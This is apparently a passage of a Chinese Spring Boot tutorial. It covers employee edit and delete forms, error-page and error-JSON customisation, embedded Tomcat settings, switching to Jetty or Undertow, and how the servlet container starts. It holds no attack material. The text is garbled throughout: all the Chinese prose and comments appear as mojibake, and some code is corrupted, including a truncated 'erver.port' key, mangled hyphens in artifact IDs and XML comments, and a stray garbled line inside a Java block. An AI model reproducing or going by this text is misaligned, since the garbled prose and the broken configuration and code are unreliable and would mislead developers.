th:href="@{/emp/}+${emp.id}">ä¿®æ¹</a>\n   \n   \n   \n   1\n   2\n   \n   \n   å ä¸ºåå·¥ä¿®æ¹é¡µé¢ååå·¥æ·»å é¡µé¢ç»æç±»ä¼¼ï¼å æ­¤å¯ä»¥å¤ç¨ä¸ä¸ªé¡µé¢ã\n   \n   /**\n        * æ¥å°updateé¡µé¢\n        * @param id\n        * @return\n        */\n   @GetMapping("/emp/{id}")\n   public String update(@PathVariable("id")Integer id,Model model){\n       Collection<Department> departments = departmentDao.getDepartments();\n       model.addAttribute("depts",departments);\n       Employee employee = employeeDao.get(id);\n       model.addAttribute("emp",employee);\n       return "emp/add";\n   }\n   \n   @PutMapping("/emp")\n   public String update(Employee employee){\n       employeeDao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   \n   \n   æ³¨æï¼ æäº¤putè¯·æ±æ¶ï¼éè¦éç½®httphiddenmethodfilterï¼å¹¶ä¸éèinputæ¡nameä¸º"_method"ï¼valueä¸ºæäº¤æ¹æ³ã\n\n * å é¤åå·¥ä¿¡æ¯\n   \n   é¡µé¢æ·»å å é¤è¡¨åãä¸é¢çè¿ç§æ·»å æ¹å¼ä¼å½±åé¡µé¢çå¸å±\n   \n   <form th:action="@{/emp}+${emp.id}" method="post">\n       <input type="hidden" name="_method" value="delete">\n       <button class="btn btn-sm btn-danger" type="submit">å é¤</button>\n   </form>\n   \n   \n   1\n   2\n   3\n   4\n   \n\næå¥½æ¯æ¹æä¸é¢çæ¹å¼ï¼\n\n<button th:attr="del_uri=@{/emp/}+${emp.id}" class="btn btn-sm btn-danger deleteBtn">å é¤</button>\n\n\n<form id="deleteEmpForm"  method="post">\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n<script>\n\t$(".deleteBtn").click(function(){\n\t\t//å é¤å½ååå·¥ç\n\t\t$("#deleteEmpForm").attr("action",$(this).attr("del_uri")).submit();\n\t\treturn false;\n\t});\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# spring éè¯¯å¤çæºå¶\n\n# éè¯¯æºå¶åç\n\nSpringbootå¨åºéæ¶ï¼å®¢æ·ç«¯ãæå¡å¨ï¼é½ä¼è¿åä¸ä¸ªé»è®¤çé¡µé¢æèé»è®¤çjsonæ°æ®ãä¸»è¦æ¯ç±MvcErrorAutoConfigurationè¿è¡èªå¨éç½®çãæä»¬éè¦å®å¶è¿åçæ°æ®åé¡µé¢ã\n\nMvcErrorAutoConfigurationç»å®¹å¨ä¸­æ·»å äºä»¥ä¸çç»ä»¶ï¼\n\n * DefaultErrorAttributes\n   \n   // å¸®æä»¬å¨é¡µé¢è·åä¿¡æ¯\n       @Override\n   public Map<String, Object> getErrorAttributes(RequestAttributes requestAttributes,\n                                                 boolean includeStackTrace) {\n       Map<String, Object> errorAttributes = new LinkedHashMap<String, Object>();\n       errorAttributes.put("timestamp", new Date());\n       addStatus(errorAttributes, requestAttributes);\n       addErrorDetails(errorAttributes, requestAttributes, includeStackTrace);\n       addPath(errorAttributes, requestAttributes);\n       return errorAttributes;\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n * BasicErrorController\n   \n   @Controller\n   @RequestMapping("${server.error.path:${error.path:/error}}")\n   public class BasicErrorController extends AbstractErrorController {\n       @RequestMapping(produces = "text/html")//äº§çhtmlç±»åçæ°æ®ï¼æµè§å¨åéçè¯·æ±æ¥å°è¿ä¸ªæ¹æ³å¤ç\n       public ModelAndView errorHtml(HttpServletRequest request,\n                                     HttpServletResponse response) {\n           HttpStatus status = getStatus(request);\n           Map<String, Object> model = Collections.unmodifiableMap(getErrorAttributes(\n               request, isIncludeStackTrace(request, MediaType.TEXT_HTML)));\n           response.setStatus(status.value());\n           //å»åªä¸ªé¡µé¢ä½ä¸ºéè¯¯é¡µé¢ï¼åå«é¡µé¢å°ååé¡µé¢åå®¹\n           ModelAndView modelAndView = resolveErrorView(request, response, status, model);\n           return (modelAndView == null ? new ModelAndView("error", model) : modelAndView);\n       }\n       @RequestMapping\n       @ResponseBody //äº§çjsonæ°æ®ï¼å¶ä»å®¢æ·ç«¯æ¥å°è¿ä¸ªæ¹æ³å¤çï¼\n       public ResponseEntity<Map<String, Object>> error(HttpServletRequest request) {\n           Map<String, Object> body = getErrorAttributes(request,\n                                                         isIncludeStackTrace(request, MediaType.ALL));\n           HttpStatus status = getStatus(request);\n           return new ResponseEntity<Map<String, Object>>(body, status);\n       }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   \n\n * ErrorPageCustomizer\n   \n   @Value("${error.path:/error}")\n   private String path = "/error"; ç³»ç»åºç°éè¯¯ä»¥åæ¥å°errorè¯·æ±è¿è¡å¤çï¼ï¼web.xmlæ³¨åçéè¯¯é¡µ\n       é¢è§åï¼\n   \n   \n   1\n   2\n   3\n   \n\n * DefaultErrorViewResolver\n   \n   @Override\n   public ModelAndView resolveErrorView(HttpServletRequest request, HttpStatus status,\n                                        Map<String, Object> model) {\n       ModelAndView modelAndView = resolve(String.valueOf(status), model);\n       if (modelAndView == null && SERIES_VIEWS.containsKey(status.series())) {\n           modelAndView = resolve(SERIES_VIEWS.get(status.series()), model);\n       }\n       return modelAndView;\n   }\n   private ModelAndView resolve(String viewName, Map<String, Object> model) {\n       //é»è®¤SpringBootå¯ä»¥å»æ¾å°ä¸ä¸ªé¡µé¢ï¼ error/404\n       String errorViewName = "error/" + viewName;\n       //æ¨¡æ¿å¼æå¯ä»¥è§£æè¿ä¸ªé¡µé¢å°åå°±ç¨æ¨¡æ¿å¼æè§£æ\n       TemplateAvailabilityProvider provider = this.templateAvailabilityProviders\n           .getProvider(errorViewName, this.applicationContext);\n       if (provider != null) {\n           //æ¨¡æ¿å¼æå¯ç¨çæåµä¸è¿åå°errorViewNameæå®çè§å¾å°å\n           return new ModelAndView(errorViewName, model);\n       }\n       //æ¨¡æ¿å¼æä¸å¯ç¨ï¼å°±å¨éæèµæºæä»¶å¤¹ä¸æ¾errorViewNameå¯¹åºçé¡µé¢ error/404.html\n       return resolveResource(errorViewName, model);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   \n\nä¸ä½ç³»ç»åºç°4xxæè5xxä¹ç±»çéè¯¯ï¼ErrorPageCustomizerå°±ä¼çæï¼å®å¶éè¯¯çååºè§åï¼ï¼å°±ä¼æ¥å°/errorè¯·æ±ï¼å°±ä¼è¢«BasicErrorControllerå¤çã\n\nå³äºååºé¡µé¢ï¼å»åªä¸ªé¡µé¢æ¯ç±DefaultErrorViewResolverè§£æå¾å°çã\n\nprotected ModelAndView resolveErrorView(HttpServletRequest request,\n                                        HttpServletResponse response, HttpStatus status, Map<String, Object> model) {\n    //ææçErrorViewResolverå¾å°ModelAndView\n    for (ErrorViewResolver resolver : this.errorViewResolvers) {\n        ModelAndView modelAndView = resolver.resolveErrorView(request, status, model);\n        if (modelAndView != null) {\n            return modelAndView;\n        }\n    }\n    return null;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å®å¶éè¯¯é¡µé¢\n\nææ¨¡æ¿å¼æçæåµä¸ï¼å°éè¯¯é¡µé¢å½åä¸ºéè¯¯ç¶æç .htmlï¼æ¾å¨æ¨¡æ¿å¼ææä»¶å¤¹éé¢çerroræä»¶å¤¹ä¸ãæä»¬å¯ä»¥ä½¿ç¨4xxå5xxä½ä¸ºéè¯¯é¡µé¢çæä»¶åæ¥å¹éè¿ç§ç±»åçææéè¯¯ï¼ç²¾ç¡®ä¼åï¼ä¼åå¯»æ¾ç²¾ç¡®çç¶æç .htmlï¼ã\n\næ²¡ææ¨¡æ¿å¼æï¼æ¨¡æ¿å¼ææ¾ä¸å°è¿ä¸ªéè¯¯é¡µé¢ï¼ï¼éæèµæºæä»¶å¤¹ä¸æ¾ï¼éæèµæºæä»¶å¤¹ä¸çä¸ä¼è¢«æ¨¡æ¿å¼æè§£æ ãä»¥ä¸é½æ²¡æéè¯¯é¡µé¢ï¼å°±æ¯é»è®¤æ¥å°SpringBooté»è®¤çéè¯¯æç¤ºé¡µé¢ã\n\næä»¬è½å¨é¡µé¢è·åçä¿¡æ¯æ¯ï¼\n\n * timestampï¼æ¶é´æ³\n * statusï¼ç¶æç \n * errorï¼éè¯¯æç¤º\n * exceptionï¼å¼å¸¸å¯¹è±¡\n * messageï¼å¼å¸¸æ¶æ¯\n * errorsï¼JSR303æ°æ®æ ¡éªçéè¯¯\n\n# å®å¶éè¯¯çjsonæ°æ®\n\n 1. èªå®ä¹å¼å¸¸å¤çå¨\n    \n    package com.pwddd.springboot.exception;\n    \n    import org.springframework.web.bind.annotation.ControllerAdvice;\n    import org.springframework.web.bind.annotation.ExceptionHandler;\n    import org.springframework.web.bind.annotation.ResponseBody;\n    \n    import java.util.HashMap;\n    import java.util.Map;\n    \n    @ControllerAdvice\n    public class MyExceptionHandler {\n    \n        @ResponseBody\n        @ExceptionHandler(UserNotExistException.class)\n        public Map<String,Object> handleException(Exception e){\n            HashMap<String, Object> map = new HashMap<>();\n            map.put("code",404);\n            map.put("msg","ç¨æ·ä¸å­å¨");\n            return map;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 2. ä»¥ä¸çä»£ç è½ç¶å¯ä»¥è¿åjsonæ°æ®ï¼ä½æ¯ï¼æµè§å¨è®¿é®ä¹è¿åjsonæ°æ®ãæä»¬éè¦è½¬åå°errorä¸ï¼å®æèªéåºå¤çå¨\n    \n    @ExceptionHandler(UserNotExistException.class)\n    public String handleException(Exception e){\n        HashMap<String, Object> map = new HashMap<>();\n        map.put("code",404);\n        map.put("msg","ç¨æ·ä¸å­å¨");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. è½¬å°errorä¹åï¼å ä¸ºæä»¬çéè¯¯ç¶æç é®é¢ï¼å¯¼è´æ²¡æå¯¹åºçéè¯¯é¡µé¢ï¼å æ­¤æ¾ç¤ºè¿æ¯é»è®¤çç©ºç½é¡µãæä»¬éè¦ä¼ å¥é»è®¤çç¶æç \n    \n    @ExceptionHandler(UserNotExistException.class)\n    public String handleException(Exception e, HttpServletRequest request){\n        HashMap<String, Object> map = new HashMap<>();\n        request.setAttribute("javax.servlet.error.status_code",400);\n        map.put("code",404);\n        map.put("msg","ç¨æ·ä¸å­å¨");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 4. æä»¬å®å¶çæ°æ®è¿æ ·æºå¸¦ä¸åºå»ï¼æä»¬éè¦å°å®å¶çæ°æ®æºå¸¦åºå»ãç¸åºçæ°æ®æ¯ç±getErrorAttributesè·åçãæä»¬æ³è¦å®å¶çè¯ï¼æä»¬å¯ä»¥å®å¨ç¼åä¸ä¸ªå®ç°ç±»ï¼å®å¨æ¿ä»£ãä½æ¯è¿æ ·å¤ªéº»ç¦äºï¼æä»¬å¯ä»¥ç»§æ¿å¹¶éåç¸åºçæ¹æ³ãé¡µé¢ä¸è½ç¨çæ°æ®ï¼æèæ¯jsonè¿åè½ç¨çæ°æ®é½æ¯éè¿errorAttributes.getErrorAttributeså¾å°ãå®¹å¨ä¸­DefaultErrorAttributes.getErrorAttributes()é»è®¤è¿è¡æ°æ®å¤çç\n    \n    //ç»å®¹å¨ä¸­å å¥æä»¬èªå·±å®ä¹çErrorAttributes\n    @Component\n    public class MyErrorAttributes extends DefaultErrorAttributes {\n        @Override\n        public Map<String, Object> getErrorAttributes(RequestAttributes requestAttributes,\n                                                      boolean includeStackTrace) {\n            Map<String, Object> map = super.getErrorAttributes(requestAttributes,\n                                                               includeStackTrace);\n            //requestAttributes.getAttributes("ext",0);   // è·åå¼å¸¸å¤çå¨çæ°æ®ã\n            map.put("company","atguigu");\n            return map;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    \n    \n    æç»çææï¼ååºæ¯èªéåºçï¼å¯ä»¥éè¿å®å¶ErrorAttributesæ¹åéè¦è¿åçåå®¹ã\n\n\n# åµå¥å¼Webå®¹å¨\n\nSpringBooté»è®¤ä½¿ç¨Tomcatä½ä¸ºåµå¥å¼çServletå®¹å¨ãæä»¬éè¦èèï¼å®å¶éç½®ãåæ¢å¶ä»çå®¹å¨ã\n\n\n\n# å®å¶tomcatéç½®\n\n 1. ä¿®æ¹åserveræå³çéç½®ï¼ServerPropertiesãä¹æ¯EmbeddedServletContainerCustomizerãï¼ã\n\nerver.port=8081\nserver.contextâpath=/crud\nserver.tomcat.uriâencoding=UTFâ8\n//éç¨çServletå®¹å¨è®¾ç½®\nserver.xxx\n//Tomcatçè®¾ç½®\nserver.tomcat.xxx\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 2. ç¼åä¸ä¸ªEmbeddedServletContainerCustomizerï¼åµå¥å¼çServletå®¹å¨çå®å¶å¨ï¼æ¥ä¿®æ¹Servletå®¹å¨çéç½®\n\n@Bean //ä¸å®è¦å°è¿ä¸ªå®å¶å¨å å¥å°å®¹å¨ä¸­\npublic EmbeddedServletContainerCustomizer embeddedServletContainerCustomizer(){\n    return new EmbeddedServletContainerCustomizer() {\n        //å®å¶åµå¥å¼çServletå®¹å¨ç¸å³çè§å\n        @Override\n        public void customize(ConfigurableEmbeddedServletContainer container) {\n            container.setPort(8083);\n        }\n    };\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# æ³¨åServletä¸å¤§ç»ä»¶ãServletãFilterãListenerã\n\nServlet:\n\n//æ³¨åä¸å¤§ç»ä»¶\n@Bean\npublic ServletRegistrationBean myServlet(){\n    ServletRegistrationBean registrationBean = new ServletRegistrationBean(new\n                                                                           MyServlet(),"/myServlet");\n    return registrationBean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nFilter:\n\n@Bean\npublic FilterRegistrationBean myFilter(){\n    FilterRegistrationBean registrationBean = new FilterRegistrationBean();\n    registrationBean.setFilter(new MyFilter());\n    registrationBean.setUrlPatterns(Arrays.asList("/hello","/myServlet"));\n    return registrationBean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nListener:\n\n@Bean\npublic ServletListenerRegistrationBean myListener(){\n    ServletListenerRegistrationBean<MyListener> registrationBean = new\n        ServletListenerRegistrationBean<>(new MyListener());\n    return registrationBean;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nSpringBootå¸®æä»¬èªå¨SpringMVCçæ¶åï¼èªå¨çæ³¨åSpringMVCçåç«¯æ§å¶å¨ãDIspatcherServletã\n\nDispatcherServletAutoConfigurationï¼\n\n@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)\n@ConditionalOnBean(value = DispatcherServlet.class, name =\n                   DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)\npublic ServletRegistrationBean dispatcherServletRegistration(\n    DispatcherServlet dispatcherServlet) {\n    ServletRegistrationBean registration = new ServletRegistrationBean(\n        dispatcherServlet, this.serverProperties.getServletMapping());\n    //é»è®¤æ¦æªï¼ / ææè¯·æ±ï¼åéæèµæºï¼ä½æ¯ä¸æ¦æªjspè¯·æ±ï¼ /*ä¼æ¦æªjsp\n    //å¯ä»¥éè¿server.servletPathæ¥ä¿®æ¹SpringMVCåç«¯æ§å¶å¨é»è®¤æ¦æªçè¯·æ±è·¯å¾\n    registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);\n    registration.setLoadOnStartup(\n        this.webMvcProperties.getServlet().getLoadOnStartup());\n    if (this.multipartConfig != null) {\n        registration.setMultipartConfig(this.multipartConfig);\n    }\n    return registration;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# æ¿æ¢å¶ä»å®¹å¨\n\nTomcaté»è®¤æ¯æï¼\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarterâweb</artifactId>\n    å¼å¥webæ¨¡åé»è®¤å°±æ¯ä½¿ç¨åµå¥å¼çTomcatä½ä¸ºServletå®¹å¨ï¼\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nJetty:\n\n<!ââ å¼å¥webæ¨¡å ââ>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarterâweb</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>springâbootâstarterâtomcat</artifactId>\n            <groupId>org.springframework.boot</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!ââå¼å¥å¶ä»çServletå®¹å¨ââ>\n<dependency>\n    <artifactId>springâbootâstarterâjetty</artifactId>\n    <groupId>org.springframework.boot</groupId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nUndertowï¼\n\n<!ââ å¼å¥webæ¨¡å ââ>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>springâbootâstarterâweb</artifactId>\n    <exclusions>\n        <exclusion>\n            <artifactId>springâbootâstarterâtomcat</artifactId>\n            <groupId>org.springframework.boot</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<!ââå¼å¥å¶ä»çServletå®¹å¨ââ>\n<dependency>\n    <artifactId>springâbootâstarterâundertow</artifactId>\n    <groupId>org.springframework.boot</groupId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# èªå¨éç½®åç\n\nEmbeddedServletContainerAutoConfigurationï¼åµå¥å¼çServletå®¹å¨èªå¨éç½®\n\n@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)\n@Configuration\n@ConditionalOnWebApplication\n@Import(BeanPostProcessorsRegistrar.class)\n//å¯¼å¥BeanPostProcessorsRegistrarï¼Springæ³¨è§£çï¼ç»å®¹å¨ä¸­å¯¼å¥ä¸äºç»ä»¶\n//å¯¼å¥äºEmbeddedServletContainerCustomizerBeanPostProcessorï¼\n//åç½®å¤çå¨ï¼beanåå§åååï¼åå»ºå®å¯¹è±¡ï¼è¿æ²¡èµå¼èµå¼ï¼æ§è¡åå§åå·¥ä½\npublic class EmbeddedServletContainerAutoConfiguration {\n    @Configuration\n    @ConditionalOnClass({ Servlet.class, Tomcat.class })//å¤æ­å½åæ¯å¦å¼å¥äºTomcatä¾èµï¼\n    @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search =\n                              SearchStrategy.CURRENT)//å¤æ­å½åå®¹å¨æ²¡æç¨æ·èªå·±å®ä¹EmbeddedServletContainerFactoryï¼åµå¥å¼ç\n    Servletå®¹å¨å·¥åï¼ä½ç¨ï¼åå»ºåµå¥å¼çServletå®¹å¨\n        public static class EmbeddedTomcat {\n            @Bean\n            public TomcatEmbeddedServletContainerFactory tomcatEmbeddedServletContainerFactory()\n            {\n                return new TomcatEmbeddedServletContainerFactory();\n            }\n        }\n    /**\n* Nested configuration if Jetty is being used.\n*/\n    @Configuration\n    @ConditionalOnClass({ Servlet.class, Server.class, Loader.class,\n                         WebAppContext.class })\n    @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search =\n                              SearchStrategy.CURRENT)\n    public static class EmbeddedJetty {\n        @Bean\n        public JettyEmbeddedServletContainerFactory jettyEmbeddedServletContainerFactory() {\n            return new JettyEmbeddedServletContainerFactory();\n        }\n    }\n    /**\n* Nested configuration if Undertow is being used.\n*/\n    @Configuration\n    @ConditionalOnClass({ Servlet.class, Undertow.class, SslClientAuthMode.class })\n    @ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search =\n                              SearchStrategy.CURRENT)\n    public static class EmbeddedUndertow {\n        @Bean\n        public UndertowEmbeddedServletContainerFactory\n            undertowEmbeddedServletContainerFactory() {\n            return new UndertowEmbeddedServletContainerFactory();\n        }\n    }\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\nEmbeddedServletContainerFactoryåµå¥å¼Servletå®¹å¨å·¥å\n\npublic interface EmbeddedServletContainerFactory {\n    //è·ååµå¥å¼çServletå®¹å¨\n    EmbeddedServletContainer getEmbeddedServletContainer(\n        ServletContextInitializer... initializers);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n\n\nåµå¥å¼çå®¹å¨å·¥åï¼\n\n\n\nåµå¥å¼çå®¹å¨ï¼\n\n\n\n@Override\npublic EmbeddedServletContainer getEmbeddedServletContainer(\n    ServletContextInitializer... initializers) {\n    //åå»ºä¸ä¸ªTomcat\n    Tomcat tomcat = new Tomcat();\n    //éç½®Tomcatçåºæ¬ç¯è\n    File baseDir = (this.baseDirectory != null ? this.baseDirectory\n                    : createTempDir("tomcat"));\n    tomcat.setBaseDir(baseDir.getAbsolutePath());\n    Connector connector = new Connector(this.protocol);\n    tomcat.getService().addConnector(connector);\n    customizeConnector(connector);\n    tomcat.setConnector(connector);\n    tomcat.getHost().setAutoDeploy(false);\n    configureEngine(tomcat.getEngine());\n    for (Connector additionalConnector : this.additionalTomcatConnectors) {\n        tomcat.getService().addConnector(additionalConnector);\n    }\n    prepareContext(tomcat.getHost(), initializers);\n    //å°éç½®å¥½çTomcatä¼ å¥è¿å»ï¼è¿åä¸ä¸ªEmbeddedServletContainerï¼å¹¶ä¸å¯å¨Tomcatæå¡å¨\n    return getTomcatEmbeddedServletContainer(tomcat);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nEmbeddedServletContainerCustomizerå®å¶å¨å¸®æä»¬ä¿®æ¹äºServletå®¹å¨çéç½®ã\n\nå®¹å¨ä¸­å¯¼å¥äºEmbeddedServletContainerCustomizerBeanPostProcessorã\n\n//åå§åä¹å\n@Override\npublic Object postProcessBeforeInitialization(Object bean, String beanName)\n    throws BeansException {\n    //å¦æå½ååå§åçæ¯ä¸ä¸ªConfigurableEmbeddedServletContainerç±»åçç»ä»¶\n    if (bean instanceof ConfigurableEmbeddedServletContainer) {\n        //\n        postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean);\n    }\n    return bean;\n}\nprivate void postProcessBeforeInitialization(\n    ConfigurableEmbeddedServletContainer bean) {\n    //è·åææçå®å¶å¨ï¼è°ç¨æ¯ä¸ä¸ªå®å¶å¨çcustomizeæ¹æ³æ¥ç»Servletå®¹å¨è¿è¡å±æ§èµå¼ï¼\n    for (EmbeddedServletContainerCustomizer customizer : getCustomizers()) {\n        customizer.customize(bean);\n    }\n}\nprivate Collection<EmbeddedServletContainerCustomizer> getCustomizers() {\n    if (this.customizers == null) {\n        // Look up does not include the parent context\n        this.customizers = new ArrayList<EmbeddedServletContainerCustomizer>(\n            this.beanFactory\n            //ä»å®¹å¨ä¸­è·åææè¿èç±»åçç»ä»¶ï¼EmbeddedServletContainerCustomizer\n            //å®å¶Servletå®¹å¨ï¼ç»å®¹å¨ä¸­å¯ä»¥æ·»å ä¸ä¸ªEmbeddedServletContainerCustomizerç±»åçç»ä»¶\n            .getBeansOfType(EmbeddedServletContainerCustomizer.class,\n                            false, false)\n            .values());\n        Collections.sort(this.customizers, AnnotationAwareOrderComparator.INSTANCE);\n        this.customizers = Collections.unmodifiableList(this.customizers);\n    }\n    return this.customizers;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n1ï¼ãSpringBootæ ¹æ®å¯¼å¥çä¾èµæåµï¼ç»å®¹å¨ä¸­æ·»å ç¸åºç EmbeddedServletContainerFactoryãTomcatEmbeddedServletContainerFactoryã\n\n2ï¼ãå®¹å¨ä¸­æä¸ªç»ä»¶è¦åå»ºå¯¹è±¡å°±ä¼æå¨åç½®å¤çå¨ãEmbeddedServletContainerCustomizerBeanPostProcessorãåªè¦æ¯åµå¥å¼çServletå®¹å¨å·¥åï¼åç½®å¤çå¨å°±å·¥ä½ã\n\n3ï¼ãåç½®å¤çå¨ï¼ä»å®¹å¨ä¸­è·åææçEmbeddedServletContainerCustomizerï¼è°ç¨å®å¶å¨çå®å¶æ¹æ³\n\n\n# åµå¥å¼Servletå®¹å¨å¯å¨åç\n\nä»ä¹æ¶ååå»ºåµå¥å¼çServletå®¹å¨å·¥åï¼ä»ä¹æ¶åè·ååµå¥å¼çServletå®¹å¨å¹¶å¯å¨Tomcatï¼è·ååµå¥å¼çServletå®¹å¨å·¥åï¼\n\n 1. SpringBootåºç¨å¯å¨è¿è¡runæ¹æ³\n 2. refreshContext(context)ãSpringBootå·æ°IOCå®¹å¨ãåå»ºIOCå®¹å¨å¯¹è±¡ï¼å¹¶åå§åå®¹å¨ï¼åå»ºå®¹å¨ä¸­çæ¯ä¸ ä¸ªç»ä»¶ããå¦ææ¯webåºç¨åå»ºAnnotationConfigEmbeddedWebApplicationContextï¼å¦åï¼ AnnotationConfigApplicationContext\n 3. refresh(context)ãå·æ°åæåå»ºå¥½çiocå®¹å¨ã\n\npublic void refresh() throws BeansException, IllegalStateException {\n    synchronized (this.startupShutdownMonitor) {\n        // Prepare this context for refreshing.\n        prepareRefresh();\n        // Tell the subclass to refresh the internal bean factory.\n        ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n        // Prepare the bean factory for use in this context.\n        prepareBeanFactory(beanFactory);\n        try {\n            // Allows postâprocessing of the bean factory in context subclasses.\n            postProcessBeanFactory(beanFactory);\n            // Invoke factory processors registered as beans in the context.\n            invokeBeanFactoryPostProcessors(beanFactory);\n            // Register bean processors that intercept bean creation.\n            registerBeanPostProcessors(beanFactory);\n            // Initialize message source for this context.\n            initMessageSource();\n            // Initialize event multicaster for this context.\n            initApplicationEventMulticaster();\n            // Initialize other special beans in specific context subclasses.\n            onRefresh();\n            // Check for listener beans and register them.\n            registerListeners();\n            // Instantiate all remaining (nonâlazyâinit) singletons.\n            finishBeanFactoryInitialization(beanFactory);\n            // Last step: publish corresponding event.\n            finishRefresh();\n        }\n        catch (BeansException ex) {\n            if (logger.isWarnEnabled()) {\n                logger.warn("Exception encountered during context initialization â " +\n                            "cancelling refresh attempt: " + ex);\n            }\n            // Destroy already created singletons to avoid dangling resources.\n            destroyBeans();\n            // Reset \'active\' flag.\n            cancelRefresh(ex);\n            // Propagate exception to caller.\n            throw ex;\n        }\n        finally {\n            // Reset common introspection caches in Spring\'s core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetCommonCaches();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n 4. onRefresh()ãwebçiocå®¹å¨éåäºonRefreshæ¹æ³\n\n 5. webiocå®¹å¨ä¼åå»ºåµå¥å¼çServletå®¹å¨ãcreateEmbeddedServletContainer()ã\n\n 6. è·ååµå¥å¼çServletå®¹å¨å·¥å\n    \n    EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory(); ä»iocå®¹å¨ä¸­è·åEmbeddedServletContainerFactoryç»ä»¶ãTomcatEmbeddedServletContainerFactoryåå»ºå¯¹è±¡ï¼åç½®å¤çå¨ä¸çæ¯è¿ä¸ªå¯¹è±¡ï¼å°±è·åææçå®å¶å¨æ¥åå®å¶Servletå®¹å¨çç¸å³éç½®ã\n\n 7. ä½¿ç¨å®¹å¨å·¥åè·ååµå¥å¼çServletå®¹å¨ï¼this.embeddedServletContainer = containerFactory .getEmbeddedServletContainer(getSelfInitializer());\n\n 8. åµå¥å¼çServletå®¹å¨åå»ºå¯¹è±¡å¹¶å¯å¨Servletå®¹å¨\n\n 9. åå¯å¨åµå¥å¼çServletå®¹å¨ï¼åå°iocå®¹å¨ä¸­å©ä¸æ²¡æåå»ºåºçå¯¹è±¡è·ååºæ¥ã\n\n\n# ä½¿ç¨å¤ç½®çServletå®¹å¨\n\n 1. å¿é¡»åå»ºä¸ä¸ªwaré¡¹ç®\n\n 2. å°åµå¥å¼çTomcatæå®ä¸ºprovided\n    \n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>springâbootâstarterâtomcat</artifactId>\n        <scope>provided</scope>\n    </dependency>\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 3. å¿é¡»ç¼åä¸ä¸ªSpringBootServletInitializerçå­ç±»ï¼å¹¶è°ç¨configureæ¹æ³\n    \n    public class ServletInitializer extends SpringBootServletInitializer {\n        @Override\n        protected 